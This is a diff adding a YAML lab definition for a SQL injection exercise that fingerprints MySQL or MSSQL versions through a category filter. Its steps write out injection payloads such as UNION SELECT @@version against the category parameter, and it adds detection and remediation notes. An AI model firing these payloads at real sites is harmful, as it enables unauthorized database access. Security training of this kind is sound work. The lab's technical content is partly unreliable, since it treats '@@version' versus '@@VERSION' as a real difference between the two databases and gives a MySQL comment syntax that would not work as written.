@@ -1,0 +1,97 @@
+# Category: SQL Injection
+name: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
+id: "sql-injection-mysql-version-001"
+category: "sql_injection"
+subcategory: "database_fingerprinting"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This lab contains a SQL injection vulnerability in the product category filter.
+  The database is either MySQL or Microsoft SQL Server. The attacker needs to
+  determine the database type and version using a UNION attack. MySQL uses
+  `@@version` and MSSQL uses `@@VERSION`.
+
+learning_objectives:
+  - Understand MySQL and MSSQL-specific SQL syntax
+  - Use `@@version` and `@@VERSION` to determine version
+  - Differentiate between database types
+
+tools:
+  - Burp Suite
+  - curl
+  - sqlmap (optional)
+
+prerequisites:
+  - Understanding of MySQL and MSSQL SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and select a category"
+      - "# Intercept the request in Burp Suite"
+    expected_output: "The category parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Determine the number of columns"
+    commands:
+      - "# Use ORDER BY to find column count"
+      - "category=Gifts' ORDER BY 1--"
+      - "# Increment until an error occurs"
+    expected_output: "Number of columns identified"
+    detection: "Database error messages"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Extract database version using UNION"
+    commands:
+      - "# For MySQL:"
+      - "category=Gifts' UNION SELECT @@version, NULL--"
+      - "# For MSSQL:"
+      - "category=Gifts' UNION SELECT @@VERSION, NULL--"
+    expected_output: "Database version information"
+    detection: "Database logs may show unusual queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URL parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  category_param: "category"
+
+assessment_questions:
+  - "What is the difference between `@@version` and `@@VERSION`?"
+  - "How can you determine if the database is MySQL or MSSQL?"
+  - "What is the `dual` table used for in MySQL?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection"
+  - url: "https://dev.mysql.com/doc/refman/8.0/en/version.html"
+    title: "MySQL Version"
